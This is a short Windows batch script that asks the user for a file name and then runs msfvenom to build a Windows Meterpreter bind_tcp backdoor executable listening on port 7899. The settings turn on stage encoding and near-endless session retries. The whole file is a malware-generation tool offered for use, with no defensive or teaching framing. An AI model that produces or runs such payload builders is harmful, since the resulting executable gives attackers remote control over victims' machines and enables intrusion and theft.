@echo off
title Create
:res
cls
set /p name=Enter the output name:
if "%name%"=="" goto res
msfvenom -p windows/meterpreter/bind_tcp LPORT=7899 EnableStageEncoding=true SessionRetryTotal=999999 -f exe -o "%name%.exe"